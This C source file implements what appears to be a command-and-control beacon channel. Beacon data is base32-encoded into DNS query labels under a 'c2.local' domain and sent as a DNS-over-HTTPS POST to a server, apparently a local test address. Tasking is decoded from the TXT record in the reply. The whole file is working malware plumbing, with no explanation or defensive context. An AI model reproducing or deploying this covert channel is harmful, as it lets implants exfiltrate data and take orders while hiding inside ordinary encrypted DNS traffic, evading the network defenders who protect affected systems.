#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#ifdef _WIN32
    #include <winsock2.h>
    typedef int socklen_t;
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
#endif

#define SERVER_IP   "127.0.0.1"
#define DOH_PORT    8853

static const char b32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";

static int base32_encode(const uint8_t *in, size_t in_len, char *out, size_t out_len) {
    if (!in || !out || out_len == 0) return 0;
    size_t j = 0;
    int buf = in[0], next = 1, bitsLeft = 8;
    while (bitsLeft > 0 || next < (int)in_len) {
        if (bitsLeft < 5) {
            if (next < (int)in_len) {
                buf <<= 8;
                buf |= in[next++] & 0xff;
                bitsLeft += 8;
            } else {
                int pad = 5 - bitsLeft;
                buf <<= pad;
                bitsLeft += pad;
            }
        }
        int idx = 0x1f & (buf >> (bitsLeft - 5));
        bitsLeft -= 5;
        if (j < out_len - 1)
            out[j++] = b32[idx];
    }
    out[j] = 0;
    return (int)j;
}

static int base32_decode(const char *in, uint8_t *out, size_t out_len) {
    if (!in || !out) return 0;
    int buf = 0, bitsLeft = 0;
    size_t j = 0;
    for (const char *p = in; *p; p++) {
        char c = *p;
        if (c >= 'A' && c <= 'Z') buf = (buf << 5) | (c - 'A');
        else if (c >= 'a' && c <= 'z') buf = (buf << 5) | (c - 'a');
        else if (c >= '2' && c <= '7') buf = (buf << 5) | (c - '2' + 26);
        else continue;
        bitsLeft += 5;
        if (bitsLeft >= 8) {
            if (j < out_len)
                out[j++] = (buf >> (bitsLeft - 8)) & 0xff;
            bitsLeft -= 8;
        }
    }
    return (int)j;
}

static int build_dns_query(const char *encoded, uint8_t *query, size_t query_size) {
    memset(query, 0, query_size);
    int qlen = 0;
    query[qlen++] = 0x00; query[qlen++] = 0x01; 
    query[qlen++] = 0x01; query[qlen++] = 0x00; 
    query[qlen++] = 0x00; query[qlen++] = 0x01; 
    query[qlen++] = 0x00; query[qlen++] = 0x00;
    query[qlen++] = 0x00; query[qlen++] = 0x00;
    query[qlen++] = 0x00; query[qlen++] = 0x00;
    size_t enc_len = strlen(encoded);
    size_t offset = 0;
    while (offset < enc_len) {
        size_t chunk = enc_len - offset;
        if (chunk > 63) chunk = 63;
        if (qlen + 1 + (int)chunk >= (int)query_size - 32) break;
        query[qlen++] = (uint8_t)chunk;
        memcpy(query + qlen, encoded + offset, chunk);
        qlen += (int)chunk;
        offset += chunk;
    }
    query[qlen++] = 2;
    memcpy(query + qlen, "c2", 2); qlen += 2;
    query[qlen++] = 5;
    memcpy(query + qlen, "local", 5); qlen += 5;
    query[qlen++] = 0x00;
    query[qlen++] = 0x00; query[qlen++] = 0x10; 
    query[qlen++] = 0x00; query[qlen++] = 0x01; 

    return qlen;
}

static int parse_dns_response(uint8_t *response, int rlen, uint8_t *task_out, size_t out_len) {
    if (rlen < 12) return 0;
    int pos = 12;
    while (pos < rlen && response[pos] != 0) {
        if ((response[pos] & 0xc0) == 0xc0) { pos += 2; break; }
        pos += response[pos] + 1;
    }
    if (pos < rlen && response[pos] == 0) pos++;
    pos += 4;
    if (pos < rlen && (response[pos] & 0xc0) == 0xc0) pos += 2;
    else while (pos < rlen && response[pos] != 0) pos++;
    pos += 10; 
    if (pos >= rlen) return 0;
    int txt_len = response[pos++];
    if (pos + txt_len > rlen || txt_len >= 256) return 0;
    char txt[256];
    memcpy(txt, response + pos, txt_len);
    txt[txt_len] = 0;
    return base32_decode(txt, task_out, out_len);
}

void doh_send_beacon(uint8_t *beacon, size_t beacon_len, uint8_t *task_out, size_t *task_len) {
    if (task_len) *task_len = 0;
    char encoded[1024];
    base32_encode(beacon, beacon_len, encoded, sizeof(encoded));
    uint8_t dns_query[512];
    int qlen = build_dns_query(encoded, dns_query, sizeof(dns_query));
    if (qlen <= 0) return;
    char http_header[256];
    int header_len = snprintf(http_header, sizeof(http_header),
        "POST /dns-query HTTP/1.1\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: application/dns-message\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n",
        SERVER_IP, DOH_PORT, qlen);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    struct sockaddr_in server;
    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(DOH_PORT);
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0){
        goto cleanup;
    }
    send(sock, http_header, header_len, 0);
    send(sock, (const char*)dns_query, qlen, 0);
    uint8_t response[4096];
    int received = recv(sock, (char*)response, sizeof(response) - 1, 0);
    if (received <= 0) goto cleanup;
    response[received] = 0;
    uint8_t *body = (uint8_t*)strstr((char*)response, "\r\n\r\n");
    if (!body) goto cleanup;
    body += 4;

    int body_len = received - (int)(body - response);
    if (body_len <= 0) goto cleanup;

    if (task_out && task_len) {
        int n = parse_dns_response(body, body_len, task_out, 1024);
        if (n > 0) *task_len = (size_t)n;
    }

cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif
}